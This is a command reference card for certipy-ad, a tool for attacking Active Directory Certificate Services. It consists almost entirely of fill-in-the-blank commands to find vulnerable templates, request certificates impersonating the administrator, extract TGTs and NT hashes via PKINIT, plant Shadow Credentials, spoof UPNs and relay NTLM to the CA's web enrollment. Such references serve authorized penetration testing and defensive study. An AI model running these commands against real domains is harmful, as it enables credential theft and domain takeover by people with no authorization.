name: Certipy Toolkit (AD CS Abuse Reference)
description: Reference for certipy-ad - the Linux tool for AD CS enumeration and abuse: find vulnerable templates/CAs (ESC1-ESC16), request certificates, authenticate via PKINIT, run Shadow Credentials, and manipulate account UPNs. Supports password, hash, and Kerberos auth.
notes:
=== ENUMERATE ===
  certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
  # flags [!] ESC1..ESC16 on templates/CAs. -stdout prints; drop it to save JSON/BloodHound.

=== REQUEST (enroll) ===
  certipy-ad req -u <user>@<domain> -p <password> -ca <ca_name> -template <template>
  # ESC1: add -upn administrator@<domain>  (or -sid <target_sid> for strong mapping)
  # ESC3: -template <enrollment_agent>  then -on-behalf-of '<domain>\administrator' -pfx agent.pfx

=== AUTHENTICATE (use the cert) ===
  certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>
  # -> TGT + NT hash (UnPAC). Add -username/-domain if the PFX lacks identity.

=== SHADOW CREDENTIALS ===
  certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>
  # add-key -> PKINIT -> UnPAC -> cleanup, in one command.  -> ad-shadow-credentials

=== ACCOUNT MANIPULATION (ESC16 / UPN spoof) ===
  certipy-ad account update -u <user>@<domain> -p <password> -user <controlled_account> -upn administrator
  certipy-ad account update ... -upn <controlled_account>@<domain>   # revert
  -> ad-esc16-upn-manipulation

=== RELAY / OTHER ===
  certipy-ad relay -target http://<ca_host>/certsrv/certfnsh.asp -template <template>   # ESC8 (NTLM relay to web enrollment)

=== TIP ===
  Sync your clock (PKINIT) before auth/shadow/ESC steps -> ad-faketime-kerberos.
